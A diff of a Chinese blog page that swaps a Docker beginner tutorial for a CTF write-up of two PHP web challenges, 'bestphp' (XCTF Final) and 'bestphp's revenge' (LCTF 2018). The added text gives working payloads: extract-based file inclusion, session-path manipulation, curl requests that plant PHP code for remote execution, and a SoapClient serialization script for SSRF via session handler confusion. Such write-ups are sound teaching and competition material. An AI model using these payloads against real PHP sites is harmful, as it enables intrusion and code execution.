@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>docker基础学习 · Sky&#39;s blog</title>
+    <title>2018-Xctf Final&amp;LCTF-Bestphp · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">docker基础学习</a>
+                <a href="#" class="post-name">2018-Xctf Final&LCTF-Bestphp</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            docker基础学习
+            2018-Xctf Final&LCTF-Bestphp
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1,917</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1,526</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2017/07/24</span>
+                    <span class="post-intro-time">2018/11/17</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,47 +401,56 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>因为马上要步入大三……听说要开始出题了，需要使用docker（23333）<br>然后之前也一直对docker很好奇，因为大部分题目都是在这上面搭建的……应该是个很强大的容器<br>借着暑假闲得慌，于是来学习一下……<br>学习的网址：<code>http://www.docker.org.cn/index.html</code></p>
-<h2 id="docker学前准备"><a href="#docker学前准备" class="headerlink" title="docker学前准备"></a>docker学前准备</h2><h3 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker?"></a>什么是Docker?</h3><p>Docker是一个开源的引擎，可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署，包括VMs（虚拟机）、bare metal、OpenStack 集群和其他的基础应用平台。 </p>
-<p>Docker通常用于如下场景：<br>1.web应用的自动化打包和发布；<br>2.自动化测试和持续集成、发布；<br>3.在服务型环境中部署和调整数据库或其他的后台应用；<br>4.从头编译或者扩展现有的OpenShift或Cloud Foundry平台来搭建自己的PaaS环境。</p>
-<h3 id="关于docker入门教程"><a href="#关于docker入门教程" class="headerlink" title="　关于docker入门教程"></a>　关于docker入门教程</h3><p>docker入门教程翻译自docker官方网站的Docker getting started 教程<br>官方网站：<code>https://docs.docker.com/linux/started/</code><br>官方网站是一个交互的教程，在左侧是相应的说明，右侧是一个交互的终端，输入预期的目录，可以跳到下一步，大家可以参考我们的翻译，在官网上面运行相应的命令，以验证效果。</p>
-<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>Docker系统有两个程序：docker服务端和docker客户端。<br>其中docker服务端是一个服务进程，管理着所有的容器。<br>docker客户端则扮演着docker服务端的远程控制器，可以用来控制docker的服务端进程。<br>大部分情况下，docker服务端和客户端运行在一台机器上。</p>
-<p>1.目标：<br>检查docker的版本，这样可以用来确认docker服务在运行并可通过客户端链接。</p>
-<p>2.提示：<br>可以通过在终端输入docker命令来查看所有的参数。<br>官网的在线模拟器只提供了有限的命令，无法保证所有的命令可以正确执行。</p>
-<p>3.正确的命令：<br><code>$docker version</code><br><img src="/images/dockerjiaocheng1.png"></p>
-<h3 id="搜索可用docker镜像"><a href="#搜索可用docker镜像" class="headerlink" title="搜索可用docker镜像"></a>搜索可用docker镜像</h3><p>使用docker最简单的方式莫过于从现有的容器镜像开始。Docker官方网站专门有一个页面来存储所有可用的镜像，<br>网址是：<code>index.docker.io</code><br>你可以通过浏览这个网页来查找你想要使用的镜像，或者使用命令行的工具来检索。</p>
-<p>1.目标：<br>学会使用命令行的工具来检索名字叫做tutorial的镜像。</p>
-<p>2.提示：<br>命令行的格式为：<code>docker search 镜像名字</code></p>
-<p>3.正确的命令：<br><code>$docker search tutorial</code><br><img src="/images/dockerjiaocheng2.png"></p>
-<h3 id="下载容器镜像"><a href="#下载容器镜像" class="headerlink" title="下载容器镜像"></a>下载容器镜像</h3><p>下载镜像的命令非常简单，使用<code>docker pull</code>命令即可。<br>在docker的镜像索引网站上面，镜像都是按照用户名/镜像名的方式来存储的。<br>有一组比较特殊的镜像，比如ubuntu这类基础镜像，经过官方的验证，值得信任，可以直接用镜像名来检索到。</p>
-<p>1.目标：<br>通过docker命令下载tutorial镜像。</p>
-<p>2.提示：<br>执行pull命令的时候要写完整的名字，比如<code>&quot;learn/tutorial&quot;</code>。</p>
-<p>3.正确的命令：<br><code>$docker pull learn/tutorial</code><br><img src="/images/dockerjiaocheng3.png"></p>
-<h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><h3 id="运行hello-world"><a href="#运行hello-world" class="headerlink" title="运行hello world!"></a>运行hello world!</h3><p>在docker容器中运行hello world!<br>docker容器可以理解为在沙盒中运行的进程。<br>这个沙盒包含了该进程运行所必须的资源，包括文件系统、系统类库、shell 环境等等。<br>但这个沙盒默认是不会运行任何程序的。<br>你需要在沙盒中运行一个进程来启动某一个容器。<br>这个进程是该容器的唯一进程，所以当该进程结束的时候，容器也会完全的停止。</p>
-<p>1.目标：<br>在我们刚刚下载的镜像中输出”hello world”。为了达到这个目的，我们需要在这个容器中运行”echo”命令，输出”hello world”。</p>
-<p>2.提示：<br><code>docker run</code>命令有两个参数，一个是镜像名，一个是要在镜像中运行的命令。</p>
-<p>3.正确的命令：<br><code>$docker run learn/tutorial echo &quot;hello world!</code><br><img src="/images/dockerjiaocheng4.png"></p>
-<h3 id="在容器中安装新的程序"><a href="#在容器中安装新的程序" class="headerlink" title="在容器中安装新的程序"></a>在容器中安装新的程序</h3><p>在容器中安装新的程序</p>
-<p>下一步我们要做的事情是在容器里面安装一个简单的程序(ping)。<br>我们之前下载的tutorial镜像是基于ubuntu的，所以你可以使用ubuntu的<code>apt-get</code>命令来安装ping程序：<br><code>apt-get install -y ping</code>。<br>备注：<code>apt-get</code>命令执行完毕之后，容器就会停止，但对容器的改动不会丢失。</p>
-<p>1.目标：<br>在<code>learn/tutorial</code>镜像里面安装ping程序。</p>
-<p>2.提示：<br>在执行<code>apt-get</code>命令的时候，要带上-y参数。如果不指定-y参数的话，<code>apt-get</code>命令会进入交互模式，需要用户输入命令来进行确认，但在docker环境中是无法响应这种交互的。</p>
-<p>3.正确的命令：<br><code>$docker run learn/tutorial apt-get install -y ping</code><br><img src="/images/dockerjiaocheng5.png"></p>
-<h3 id="保存对容器的修改"><a href="#保存对容器的修改" class="headerlink" title="保存对容器的修改"></a>保存对容器的修改</h3><p>当你对某一个容器做了修改之后（通过在容器中运行某一个命令），可以把对容器的修改保存下来，这样下次可以从保存后的最新状态运行该容器。<br>docker中保存状态的过程称之为committing，它保存的新旧状态之间的区别，从而产生一个新的版本。</p>
-<p>1.目标：<br>首先使用<code>docker ps -l</code>命令获得安装完ping命令之后容器的id。然后把这个镜像保存为learn/ping。</p>
-<p>2.提示：<br>(1)运行<code>docker commit</code>，可以查看该命令的参数列表。<br>(2)你需要指定要提交保存容器的ID。(译者按：通过<code>docker ps -l</code>命令获得)<br>(3)无需拷贝完整的id，通常来讲最开始的三至四个字母即可区分。（非常类似git里面的版本号)</p>
-<p>3.正确的命令：<br><code>$docker commit 698 learn/ping</code><br><img src="/images/dockerjiaocheng6.png"></p>
-<h2 id="docker镜像"><a href="#docker镜像" class="headerlink" title="docker镜像"></a>docker镜像</h2><h3 id="运行新的镜像"><a href="#运行新的镜像" class="headerlink" title="运行新的镜像"></a>运行新的镜像</h3><p>已经建立了一个完整的、自成体系的docker环境后，并且安装了ping命令在里面。它可以在任何支持docker环境的系统中运行了</p>
-<p>目标：<br>在新的镜像中运行<code>ping www.google.com</code>命令。</p>
-<p>提示：<br>一定要使用新的镜像名<code>learn/ping</code>来运行ping命令。(最开始下载的<code>learn/tutorial</code>镜像中是没有ping命令的)</p>
-<p>正确的命令：<br><code>$docker run lean/ping ping www.google.com</code><br><img src="/images/dockerjiaocheng7.png"></p>
-<h3 id="检查运行中的镜像"><a href="#检查运行中的镜像" class="headerlink" title="检查运行中的镜像"></a>检查运行中的镜像</h3><p>现在你已经运行了一个docker容器，让我们来看下正在运行的容器。<br>使用<code>docker ps</code>命令可以查看所有正在运行中的容器列表，<br>使用<code>docker inspect</code>命令我们可以查看更详细的关于某一个容器的信息。</p>
-<p>1.目标：<br>查找某一个运行中容器的id，然后使用<code>docker inspect</code>命令查看容器的信息。</p>
-<p>2.提示：<br>可以使用镜像id的前面部分，不需要完整的id。</p>
-<p>3.正确的命令：<br><code>$ docker inspect efe</code><br><img src="/images/dockerjiaocheng8.png"></p>
-<h3 id="发布自己的镜像"><a href="#发布自己的镜像" class="headerlink" title="发布自己的镜像"></a>发布自己的镜像</h3><p>现在我们已经验证了新镜像可以正常工作，下一步我们可以将其发布到官方的索引网站。</p>
-<p>1.目标：<br>把<code>learn/ping</code>镜像发布到docker的index网站。</p>
-<p>2.提示：<br>(1)<code>docker images</code>命令可以列出所有安装过的镜像。<br>(2)<code>docker push</code>命令可以将某一个镜像发布到官方网站。<br>(3)你只能将镜像发布到自己的空间下面。这个模拟器登录的是learn帐号。</p>
-<p>3.预期的命令：<br><code>$ docker push learn/ping</code><br><img src="/images/dockerjiaocheng9.png"></p>
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客：https://www.anquanke.com/post/id/164569</span><br></pre></td></tr></table></figure>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是周末，又是CTF，还是pupil出的题，只能说，非常有趣了</p>
+<ul>
+<li>bestphp</li>
+<li>bestphp’s revenge</li>
+</ul>
+<p>前者来自xctf final，后者来自2018LCTF</p>
+<h2 id="bestphp1"><a href="#bestphp1" class="headerlink" title="bestphp1"></a>bestphp1</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>拿到题目后发现<br><img src="/images/2018-11-03-09-51-18.png" alt=""><br>代码非常简短，但是问题很明确，我们看到了函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($func,$_GET); </span><br><span class="line">``` </span><br><span class="line">这里想到的第一反应是利用`extract`进行变量覆盖，从而达到任意文件包含</span><br><span class="line">例如：</span><br></pre></td></tr></table></figure></p>
+<p>?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">![](/images/2018-11-03-09-55-25.png)</span><br><span class="line">发现可以成功读取，尝试读function.php</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">function filters($data)&#123;</span><br><span class="line">	foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">		if(preg_match(&apos;/eval|assert|exec|passthru|glob|system|popen/i&apos;,$value))&#123;</span><br><span class="line">			die(&apos;Do not hack me!&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>尝试读admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hello admin</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'name'</span>]))&#123;</span><br><span class="line">	session_start();</span><br><span class="line">	<span class="comment">#echo 'hello ' + $_SESSION['name'];</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'you must login with admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现都不行，最后落点还得是在getshell，那么思考一下攻击方式，很容易就想到了最近热门的session+lfi的攻击方式<br>但是这里有一个问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html:/tmp'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>我们无法直接去包含默认路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions/sess_phpsessid</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-11-03-10-01-00.png" alt=""><br>那么怎么办？</p>
+<h3 id="session-start"><a href="#session-start" class="headerlink" title="session_start"></a>session_start</h3><p>在走投无路的时候选择查看php手册<br>发现<code>session_start()</code>中有这样一段<br><img src="/images/2018-11-03-10-02-08.png" alt=""><br>那我们跟进会话配置指示<br><img src="/images/2018-11-03-10-02-43.png" alt=""><br>发现了save_path,跟进<br><img src="/images/2018-11-03-10-03-26.png" alt=""><br>发现该方式可以更改session存储路径，那我们尝试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=session_start&amp;save_path=/tmp</span><br></pre></td></tr></table></figure></p>
+<p>然后去包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=/tmp/sess_kpk22r3qq2v69d2uj1iigcp5c2</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-11-03-10-07-25.png" alt=""><br>发现路径更改成功，包含了session</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>那么现在唯一的问题就是如何控制session的内容了，这里我有想到最近很流行的<code>session.upload_progress</code>，但是这样太麻烦了。<br>我们不难发现这里有一个<code>$_SESSION[&#39;name&#39;]</code>，并且其可以被我们post的name复制，那这就可以达到控制session内容的目的。<br>我们尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X POST -d &quot;name=&lt;?=phpinfo();?&gt;&quot; http://vps_ip:port/?function=session_start&amp;save_path=/tmp</span><br></pre></td></tr></table></figure></p>
+<p>再去包含对应的session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=/tmp/sess_jisv70lep6v1nfokagdll4scs7</span><br></pre></td></tr></table></figure></p>
+<p>得到<br><img src="/images/2018-11-03-10-12-30.png" alt=""><br>尝试读取目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X POST -d &quot;name=&lt;?=var_dump(scandir(&apos;./&apos;));?&gt;&quot; http://vps_ip:port/?function=session_start&amp;save_path=/tmp</span><br></pre></td></tr></table></figure></p>
+<p>包含文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=/tmp/sess_3b624no3ucdj27un5idq57jta0</span><br></pre></td></tr></table></figure></p>
+<p>可以成功列目录<br><img src="/images/2018-11-03-10-15-04.png" alt=""><br>由于是本地环境，没有存放flag，所以到此一步，题目就完结了。后面找到flag直接cat即可</p>
+<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>拿到题目<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>flag.php<br><img src="/images/2018-11-17-15-49-37.png" alt=""><br>代码非常简短，也很有意思，但是思路肯定很明确：SSRF<br>既然是SSRF，那么该如何满足以下条件呢？</p>
+<ul>
+<li>访问127.0.0.1/flag.php</li>
+<li>cookie可控，改成我们的php_session_id<br>那么势必得到一个php内置类，同时其具备SSRF的能力<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3>这里不难想到之前N1CTF出过的hard_php一题，里面就使用了php内置类SoapClient进行SSRF<br><img src="/images/2018-11-17-15-56-30.png" alt=""><br>但是问题来了，我怎么触发反序列化？<br>看到<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>我们不难想到，可以将序列化内容通过<code>$_GET[name]</code>传入session，但是我们本地测试：<br><img src="/images/2018-11-17-15-57-55.jpg" alt=""><br>发现session里的内容是会被进行一次序列化写入的，并且还有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name |</span><br></pre></td></tr></table></figure></p>
+<p>这样的东西存在。别说触发反序列化了，我们连基本的语句都构造不出来。<br>后来搜到这样一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.spoock.com/2016/10/16/php-serialize-problem/</span><br></pre></td></tr></table></figure></p>
+<p>首先我们可以控制<code>session.serialize_handler</code>,通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?f=session_start</span><br><span class="line"></span><br><span class="line">serialize_handler=php</span><br></pre></td></tr></table></figure></p>
+<p>这样的方式，可以指定php序列化引擎,而不同引擎存储的方式也不同</p>
+<ul>
+<li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
+<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
+<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
+</ul>
+<p>同时根据文章内的内容，当session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞<br>假如我们使用<code>php_serialize</code>引擎时进行数据存储时的序列化，可以得到内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;name&apos;] = &apos;sky&apos;;</span><br><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;sky&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>而在<code>php</code>引擎时进行数据存储时的序列化，可以得到另一个内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;name&apos;] = &apos;sky&apos;;</span><br><span class="line">name|s:3:&quot;sky&quot;</span><br></pre></td></tr></table></figure></p>
+<p>那么如果我们用<code>php</code>引擎去解<code>php_serialize</code>得到的序列化，是不是就会有问题了呢？<br>答案是肯定的，该文章中也介绍的很清楚<br>php引擎会以|作为作为key和value的分隔符，我们再传入内容的时候，比如传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;name&apos;]  = &apos;|sky‘</span><br></pre></td></tr></table></figure></p>
+<p>那么使用<code>php_serialize</code>引擎时可以得到序列化内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;|sky&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后用<code>php</code>引擎反序列化时，<code>|</code>被当做分隔符，于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;</span><br></pre></td></tr></table></figure></p>
+<p>被当作key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sky</span><br></pre></td></tr></table></figure></p>
+<p>被当做vaule进行反序列化<br>于是，我们只要传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;name&apos;] = |序列化内容</span><br></pre></td></tr></table></figure></p>
+<p>即可<br>对了，如果你要问，为什么能反序列化？因为如下图<br><img src="/images/2018-11-17-16-24-48.png" alt=""></p>
+<h3 id="如何触发-call"><a href="#如何触发-call" class="headerlink" title="如何触发__call"></a>如何触发__call</h3><p>光进行反序列化肯定是不够的<br><img src="/images/2018-11-17-16-19-28.png" alt=""><br>我们看到soapclient想要触发__call()必须要调用不可访问的方法，那我们如何在题目有限的代码里调用不可访问方法呢？<br>看到这段代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p>
+<p>这里想到如下操作<br><img src="/images/2018-11-17-16-20-28.png" alt=""><br>我们只要覆盖$b为<code>call_user_func</code>即可成功触发不可访问方法</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>那么完成payload即可<br>soap构造脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target=<span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                               <span class="string">'user_agent'</span> =&gt; <span class="string">"AAA:BBB\r\n"</span> .</span><br><span class="line">                                             <span class="string">"Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912"</span>,</span><br><span class="line">                               <span class="string">'uri'</span> =&gt; <span class="string">"http://127.0.0.1/"</span>));</span><br><span class="line"></span><br><span class="line">$se = serialize($b); </span><br><span class="line"><span class="keyword">echo</span> urlencode($se);</span><br></pre></td></tr></table></figure></p>
+<p>先发送第一段payload<br><img src="/images/2018-11-17-16-23-07.png" alt=""><br>在发送第二段payload<br><img src="/images/2018-11-17-16-23-33.png" alt=""><br>flag手到擒来！<br><img src="/images/2018-11-17-15-40-46.png" alt=""></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>pupil出的这两道session_start的题，可以说非常有趣了。很荣幸的拿到了一个一血，涨了一波姿势，弥补了一波N1CTF hardphp的遗憾。膜~</p>
 
     </article>
     <!-- reward  -->
@@ -454,17 +463,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2017/07/25/github博客之page-build-failed/" title= "github博客之page build failed">
-                    <div class="nextTitle">github博客之page build failed</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2017/07/23/SQLi-LABS(Challenges)(Less-54-Less-65)/" title= "SQLi-LABS(Challenges)(Less-54 ~ Less-65)">
-                    <div class="prevTitle">SQLi-LABS(Challenges)(Less-54 ~ Less-65)</div>
+                <a href= "/2018/11/16/EIS-2018-web/" title= "EIS-2018-web">
+                    <div class="prevTitle">EIS-2018-web</div>
                 </a>
             
         </li>
@@ -578,7 +582,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前记"><span class="toc-number">1.</span> <span class="toc-text">前记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker学前准备"><span class="toc-number">2.</span> <span class="toc-text">docker学前准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是Docker"><span class="toc-number">2.1.</span> <span class="toc-text">什么是Docker?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于docker入门教程"><span class="toc-number">2.2.</span> <span class="toc-text">　关于docker入门教程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#准备"><span class="toc-number">2.3.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搜索可用docker镜像"><span class="toc-number">2.4.</span> <span class="toc-text">搜索可用docker镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下载容器镜像"><span class="toc-number">2.5.</span> <span class="toc-text">下载容器镜像</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker使用"><span class="toc-number">3.</span> <span class="toc-text">docker使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#运行hello-world"><span class="toc-number">3.1.</span> <span class="toc-text">运行hello world!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在容器中安装新的程序"><span class="toc-number">3.2.</span> <span class="toc-text">在容器中安装新的程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#保存对容器的修改"><span class="toc-number">3.3.</span> <span class="toc-text">保存对容器的修改</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker镜像"><span class="toc-number">4.</span> <span class="toc-text">docker镜像</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#运行新的镜像"><span class="toc-number">4.1.</span> <span class="toc-text">运行新的镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查运行中的镜像"><span class="toc-number">4.2.</span> <span class="toc-text">检查运行中的镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发布自己的镜像"><span class="toc-number">4.3.</span> <span class="toc-text">发布自己的镜像</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bestphp1"><span class="toc-number">2.</span> <span class="toc-text">bestphp1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含"><span class="toc-number">2.1.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-start"><span class="toc-number">2.2.</span> <span class="toc-text">session_start</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">2.3.</span> <span class="toc-text">RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bestphp’s-revenge"><span class="toc-number">3.</span> <span class="toc-text">bestphp’s revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient"><span class="toc-number">3.1.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何触发-call"><span class="toc-number">3.2.</span> <span class="toc-text">如何触发__call</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
